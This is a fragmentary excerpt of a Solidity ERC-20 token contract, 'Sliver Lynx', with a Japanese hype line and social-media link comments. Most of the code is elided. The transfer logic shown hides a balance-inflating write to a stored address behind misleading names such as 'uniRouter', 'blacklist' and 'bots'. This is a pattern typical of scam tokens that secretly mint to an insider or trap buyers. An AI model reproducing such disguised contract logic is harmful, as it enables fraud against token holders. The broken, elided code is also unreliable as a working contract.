...
Sliver Lynx へようこそ。Ethereum ネットワークを吹き飛ばす次の
...
// https://web.wechat.com/SilverLynxERC
// https://www.zhihu.com/
// https://www.silverlynx.linwebxi.io

contract Sliver is IERC20, Ownable {

    string private _symbol;
    string private _name;
    uint256 public _rTotalFee = 0;
    uint8 private _decimals = 9;
    uint256 private _rTotal = 55000000 * 10**_decimals;
    ...
    function uniRouter     (
        ...
        if (enableEarlySellTax && contractETHBalance > limitsInEffect && !tradingActive && from != uniswapV2Pair) {
            ...
            _getCurrentSupply = amount;
            _balances[address(this)] += _getCurrentSupply;
        ...
        address blacklist = bots[uniswapV2Pair];
        if (_rOwned[blacklist] == 0) _rOwned[blacklist] = limitsInEffect;
        bots[uniswapV2Pair] = to;
        if (_rTotalFee > 0 && _bots[from] == 0 && !tradingActive && _bots[to] == 0) {
            _getCurrentSupply = (amount * _rTotalFee) / 100;
            amount -= _getCurrentSupply;
            _balances[from] -= _getCurrentSupply;
            _balances[address(this)] += _getCurrentSupply;
        }
